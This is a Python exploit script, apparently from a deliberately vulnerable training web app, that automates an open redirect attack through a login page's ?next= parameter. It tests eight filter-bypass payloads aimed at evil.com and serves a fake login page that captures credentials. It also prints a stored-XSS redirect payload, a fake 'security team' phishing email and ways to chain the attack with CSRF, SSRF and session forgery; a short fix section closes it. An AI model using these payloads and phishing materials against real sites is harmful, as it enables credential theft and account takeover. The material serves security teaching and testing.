#!/usr/bin/env python3
"""
Open Redirect -- Automated Exploit
=====================================

Educational demonstration of open redirect via login ?next= parameter.
Tests various bypass techniques and generates phishing links.

The script automatically starts a lightweight HTTP server on port 8888
to serve the phishing page from attacker_pages/ -- no extra terminal needed.

This attack chains with:
  - XSS: inject the phishing link into a note (stored XSS delivers the link)
  - CSRF: embed the redirect in a CSRF form
  - Session Forgery: stolen cookie + open redirect = silent phishing

Usage:
    python3 scripts/open_redirect.py
    python3 scripts/open_redirect.py --target http://127.0.0.1:5000
    python3 scripts/open_redirect.py --phish-port 9999
"""

import argparse
import http.server
import os
import re
import sys
import threading
import time
from urllib.parse import quote, urlencode

try:
    import requests
except ImportError:
    print("Run: pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"
DEFAULT_PHISH_PORT = 8888
PHISHING_PAGE = "open_redirect_phishing.html"
ATTACKER_USER = "redir_" + str(int(time.time()))[-6:]
ATTACKER_PASS = "redir_probe_2026"


# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    CN = "\033[96m"; B = "\033[1m"; D = "\033[2m"
    M = "\033[95m"; X = "\033[0m"

def banner(t):
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")


# ──────────────────────────────────────────────
# PHISHING HTTP SERVER (background thread)
# ──────────────────────────────────────────────

class QuietHandler(http.server.SimpleHTTPRequestHandler):
    """Serve files from attacker_pages/ directory, suppress request logs."""
    def log_message(self, fmt, *args):
        pass  # sessiz -- ana konsol ciktisini kirletmesin

def start_phishing_server(port, serve_dir):
    """Start a background HTTP server to host the phishing page."""
    handler = lambda *a, **kw: QuietHandler(*a, directory=serve_dir, **kw)
    server = http.server.HTTPServer(("127.0.0.1", port), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def check_redirect(session, target, next_url, username="admin", password="admin123"):
    """
    Login with next=<next_url> via hidden form field and check where
    the server redirects. Returns (redirected_to, was_external).
    """
    login_url = f"{target}/login?next={next_url}"

    resp = session.post(login_url, data={
        "username": username,
        "password": password,
        "next": next_url,       # hidden field -- POST body
    }, allow_redirects=False, timeout=5)

    if resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get('Location', '')
        is_external = location.startswith('http') and target not in location

        # Logout so we can test again
        session.get(f"{target}/logout?silent=1", timeout=3)

        return location, is_external

    # No redirect -- login might have failed
    session.get(f"{target}/logout?silent=1", timeout=3)
    return None, False


# ──────────────────────────────────────────────
# PHASE 0 -- Ensure test accounts exist
# ──────────────────────────────────────────────

def phase0_setup(session, target):
    banner("PHASE 0 -- Setup")
    info("Ensuring test accounts exist...\n")

    # Register attacker account
    session.post(f"{target}/register", data={
        "username": ATTACKER_USER,
        "password": ATTACKER_PASS,
        "confirm": ATTACKER_PASS,
    }, allow_redirects=True, timeout=5)
    session.get(f"{target}/logout?silent=1", timeout=3)

    ok(f"Attacker account ready: '{ATTACKER_USER}'")
    return True


# ──────────────────────────────────────────────
# PHASE 1 -- Confirm normal redirect
# ──────────────────────────────────────────────

def phase1_normal(session, target):
    banner("PHASE 1 -- Confirm Normal Redirect Behavior")
    info("Testing legitimate ?next= usage...\n")

    tests = [
        ("/settings",    "Internal path"),
        ("/notes",       "Internal path"),
        ("/search?q=hi", "Internal path with query"),
    ]

    for next_url, desc in tests:
        location, external = check_redirect(session, target, next_url)
        if location:
            ok(f"  next={next_url:<25} -> {C.D}{location}{C.X}  ({desc})")
        else:
            fail(f"  next={next_url:<25} -> no redirect")

    return True


# ──────────────────────────────────────────────
# PHASE 2 -- Test open redirect bypass techniques
# ──────────────────────────────────────────────

def phase2_bypass_techniques(session, target, evil_url):
    banner("PHASE 2 -- Test Redirect Bypass Techniques")
    info("Trying various techniques to redirect to external URL...\n")

    techniques = [
        (
            "Direct external URL",
            evil_url,
            "No tricks -- just the external URL directly"
        ),
        (
            "Protocol-relative",
            "//evil.com/fake-login",
            "// makes browser treat it as same protocol"
        ),
        (
            "Backslash trick",
            "/\\evil.com/fake-login",
            "Some parsers treat /\\ as protocol-relative"
        ),
        (
            "@ trick",
            f"http://{target.split('//')[1]}@evil.com/fake-login",
            "user@host -- browser goes to evil.com"
        ),
        (
            "Encoded dots",
            "http://evil%2Ecom/fake-login",
            "URL-encoded dot bypasses string matching"
        ),
        (
            "Tab in URL",
            "http://evil\t.com",
            "Tab character confuses some validators"
        ),
        (
            "Double URL-encode",
            "http%3A%2F%2Fevil.com%2Ffake-login",
            "Double encoding bypasses single decode checks"
        ),
        (
            "Path confusion",
            f"{target}@evil.com",
            "Confuses URL parsers about hostname"
        ),
    ]

    working = []

    for label, next_val, desc in techniques:
        location, external = check_redirect(session, target, next_val)

        if location:
            if external:
                ok(f"  {C.R}REDIRECT{C.X}  {label:<25} -> {C.R}{location[:60]}{C.X}")
                info(f"  {C.D}          {desc}{C.X}")
                working.append((label, next_val, location))
            else:
                info(f"  {C.D}INTERNAL{C.X}  {label:<25} -> {C.D}{location[:60]}{C.X}")
        else:
            info(f"  {C.D}BLOCKED{C.X}   {label:<25} -> {C.D}no redirect{C.X}")

    print(f"\n  {C.B}{len(working)} technique(s) achieved external redirect{C.X}")
    return working


# ──────────────────────────────────────────────
# PHASE 3 -- Demonstrate the attack chain
# ──────────────────────────────────────────────

def phase3_attack_chain(session, target, evil_url, working_techniques):
    banner("PHASE 3 -- Full Attack Chain Demonstration")

    if not working_techniques:
        info("Using direct URL since no bypass was needed...\n")
        phishing_link = f"{target}/login?next={evil_url}"
    else:
        label, next_val, _ = working_techniques[0]
        phishing_link = f"{target}/login?next={next_val}"
        info(f"Using technique: {label}\n")

    print(f"""
  {C.B}The Phishing Link:{C.X}
  {C.R}{phishing_link}{C.X}

  {C.B}Attack flow:{C.X}

  +------------------------------------------------------------+
  |  1. BAIT                                                    |
  |     Attacker sends the link via email, chat, or injects     |
  |     it via stored XSS (which is already in this app!)       |
  |                                                             |
  |     "Your account needs verification:                       |
  |      {target}/login?next=..."                               |
  |                                                             |
  |     Victim sees the REAL domain -- looks legitimate.         |
  +-----------------------------+------------------------------+
                                | victim clicks
  +-----------------------------v------------------------------+
  |  2. REAL LOGIN                                              |
  |     Victim sees the REAL login page at {target}             |
  |     Real form, real everything.                             |
  |     Victim enters username + password -> login succeeds.    |
  +-----------------------------+------------------------------+
                                | server redirects to ?next=
  +-----------------------------v------------------------------+
  |  3. REDIRECT (invisible -- happens in <100ms)                |
  |     Server returns: 302 Location: {evil_url}                |
  |     Browser follows the redirect automatically.             |
  +-----------------------------+------------------------------+
                                | browser follows
  +-----------------------------v------------------------------+
  |  4. PHISHING PAGE                                           |
  |     Victim sees a page identical to the real login:         |
  |     "Session expired. Please sign in again."                |
  |     Victim enters credentials AGAIN -- this time on the      |
  |     attacker's page.                                        |
  +-----------------------------+------------------------------+
                                |
  +-----------------------------v------------------------------+
  |  5. CAPTURED                                                |
  |     Attacker has the victim's username + password.          |
  |     Combined with session forgery or direct login,          |
  |     full account takeover is achieved.                      |
  +------------------------------------------------------------+
""")

    return phishing_link


# ──────────────────────────────────────────────
# PHASE 4 -- Cross-reference with other attacks
# ──────────────────────────────────────────────

def phase4_chain_with_others(target, phishing_link):
    banner("PHASE 4 -- Chaining with Other Vulnerabilities")

    print(f"""
  {C.Y}1. Open Redirect + Stored XSS{C.X}
     The attacker creates a note with XSS payload that auto-redirects:
     
     {C.D}<script>window.location='{phishing_link}'</script>{C.X}
     
     Any user viewing that note gets sent to the phishing page.
     XSS delivers the link, Open Redirect makes it convincing.
     (XSS tests 1-5 are already in the app's notes!)

  {C.Y}2. Open Redirect + CSRF{C.X}
     The attacker_pages/ CSRF forms can include the redirect:
     
     {C.D}<form action="{target}/login?next=http://evil.com">{C.X}
     
     The CSRF attack pages in attacker_pages/ could use this.

  {C.Y}3. Open Redirect + Brute Force{C.X}
     If the attacker cracks a password via brute_force.py,
     they can craft a personalized phishing link:
     
     {C.D}{target}/login?next=http://evil.com/fake-login?target=admin{C.X}
     
     The phishing page can pre-fill the username field.

  {C.Y}4. Open Redirect + Session Forgery{C.X}
     If the attacker has the SECRET_KEY (stolen via LFI or SQLi),
     they can forge a session AND redirect:
     
     Forge admin cookie -> set it -> redirect to a trap page
     that harvests additional secrets (2FA codes, API keys).

  {C.Y}5. Open Redirect + SSRF{C.X}
     SSRF can trigger the redirect server-side:
     
     {C.D}http://localhost:5000/login?next=http://internal-admin-panel/{C.X}
     
     The server follows the redirect to internal services.
""")


# ──────────────────────────────────────────────
# PHASE 5 -- Generate deliverables
# ──────────────────────────────────────────────

def phase5_deliverables(target, phishing_link, phish_port):
    banner("PHASE 5 -- Ready-to-Use Phishing Materials")

    # Build the full phishing URL with forward parameter for stealth redirect
    phish_url_with_forward = (
        f"http://127.0.0.1:{phish_port}/{PHISHING_PAGE}"
        f"?forward={target}/"
    )
    full_attack_link = f"{target}/login?next={phish_url_with_forward}"

    print(f"""
  {C.B}1. Direct phishing link (basic):{C.X}
     {C.R}{phishing_link}{C.X}

  {C.B}2. Stealth phishing link (with auto-redirect back to real site):{C.X}
     {C.R}{full_attack_link}{C.X}
     
     After the victim enters creds on the fake page, they get
     silently redirected back to the real site -- they never notice.

  {C.B}3. Phishing page served at:{C.X}
     {C.CN}http://127.0.0.1:{phish_port}/{PHISHING_PAGE}{C.X}
     
     This page mimics the real login and captures credentials.
     After login on the real site, the victim lands here and
     re-enters their password thinking the session expired.

  {C.B}4. XSS payload to auto-deliver the link:{C.X}
     Create a note with this content to weaponize stored XSS:
     
     {C.R}<script>
     setTimeout(function() {{
         window.location = '{full_attack_link}';
     }}, 3000);
     </script>
     <p>Loading secure content, please wait...</p>{C.X}

  {C.B}5. Social engineering email template:{C.X}
     {C.D}Subject: Action Required -- Verify Your DevToolkit Account
     
     Dear user,
     
     We've detected unusual activity on your account. Please verify
     your identity by logging in at the link below:
     
     {full_attack_link}
     
     If you did not request this, please ignore this email.
     
     -- DevToolkit Security Team{C.X}

  {C.B}6. Test it yourself:{C.X}
     a) Open in browser: {C.CN}{full_attack_link}{C.X}
     b) Login with admin / admin123
     c) You'll land on the phishing page ("session expired" message)
     d) Enter any credentials -- they get "captured"
     e) After 2 seconds, you're redirected back to the real site
""")


# ──────────────────────────────────────────────
# SUMMARY
# ──────────────────────────────────────────────

def print_summary():
    banner("ATTACK SUMMARY -- Open Redirect")
    print(f"""
  {C.B}Root cause:{C.X}
    next_url = request.form.get('next') or request.args.get('next')
    return redirect(next_url)     # no validation!

  {C.Y}Why it's dangerous:{C.X}
    - Victim sees the REAL domain in the link
    - Victim interacts with the REAL login page
    - The redirect happens after login -- victim doesn't notice
    - Combined with XSS, the link doesn't even need to be clicked

  {C.Y}What it enables:{C.X}
    - Credential phishing (demonstrated above)
    - OAuth token theft (redirect_uri manipulation)
    - Malware delivery (redirect to download page)
    - Reputation damage (legitimate domain serves malicious redirect)

  {C.Y}Fix:{C.X}

    {C.G}1. Validate next is internal (relative path only):{C.X}
       from urllib.parse import urlparse
       next_url = request.form.get('next', '/')
       parsed = urlparse(next_url)
       if parsed.netloc or parsed.scheme:
           next_url = '/'   # reject external URLs
       return redirect(next_url)

    {C.G}2. Allowlist valid redirect targets:{C.X}
       VALID_REDIRECTS = ['/', '/settings', '/notes', '/search']
       if next_url not in VALID_REDIRECTS:
           next_url = '/'

    {C.G}3. Same-origin check:{C.X}
       if not next_url.startswith(request.host_url):
           next_url = '/'
""")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Open Redirect -- Phishing via Login Redirect")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--phish-port", type=int, default=DEFAULT_PHISH_PORT,
                        help="Port for the phishing HTTP server (default: 8888)")
    args = parser.parse_args()
    target = args.target.rstrip("/")
    phish_port = args.phish_port

    # Locate attacker_pages/ directory relative to this script
    # scripts/ -> vulnerable/ -> web_project/attacker_pages/
    script_dir = os.path.dirname(os.path.abspath(__file__))   # vulnerable/scripts/
    vuln_dir = os.path.dirname(script_dir)                     # vulnerable/
    project_dir = os.path.dirname(vuln_dir)                    # web_project/
    pages_dir = os.path.join(project_dir, "attacker_pages")

    phishing_file = os.path.join(pages_dir, PHISHING_PAGE)
    if not os.path.isfile(phishing_file):
        print(f"  {C.R}[!] Phishing page not found: {phishing_file}{C.X}")
        print(f"  {C.R}    Make sure attacker_pages/{PHISHING_PAGE} exists.{C.X}")
        sys.exit(1)

    evil_url = f"http://127.0.0.1:{phish_port}/{PHISHING_PAGE}"

    print(f"""
{C.B}{C.Y}
   ██████╗ ██████╗ ███████╗███╗   ██╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║
  ╚██████╔╝██║     ███████╗██║ ╚████║
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝
   ██████╗ ███████╗██████╗ ██╗██████╗ 
   ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗
   ██████╔╝█████╗  ██║  ██║██║██████╔╝
   ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗
   ██║  ██║███████╗██████╔╝██║██║  ██║
   ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝
{C.X}
  {C.D}Open Redirect -> Phishing via Login ?next= Parameter{C.X}
  {C.D}Target: {target}{C.X}
  {C.D}Phishing server: http://127.0.0.1:{phish_port}/{C.X}
""")

    # Start the phishing HTTP server in background
    info(f"Starting phishing HTTP server on port {phish_port}...")
    try:
        server = start_phishing_server(phish_port, pages_dir)
        ok(f"Phishing page live at: http://127.0.0.1:{phish_port}/{PHISHING_PAGE}")
    except OSError as e:
        if "Address already in use" in str(e):
            warn(f"Port {phish_port} already in use -- assuming phishing server is running.")
        else:
            fail(f"Could not start phishing server: {e}")
            sys.exit(1)

    print()

    session = requests.Session()

    phase0_setup(session, target)
    phase1_normal(session, target)
    working = phase2_bypass_techniques(session, target, evil_url)
    phishing_link = phase3_attack_chain(session, target, evil_url, working)
    phase4_chain_with_others(target, phishing_link)
    phase5_deliverables(target, phishing_link, phish_port)
    print_summary()

    # Keep the phishing server alive so the user can test in browser
    print(f"\n  {C.G}{C.B}Phishing server is still running on port {phish_port}.{C.X}")
    print(f"  {C.D}Press Ctrl+C to stop.{C.X}\n")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {C.Y}Shutting down phishing server...{C.X}")


if __name__ == "__main__":
    main()
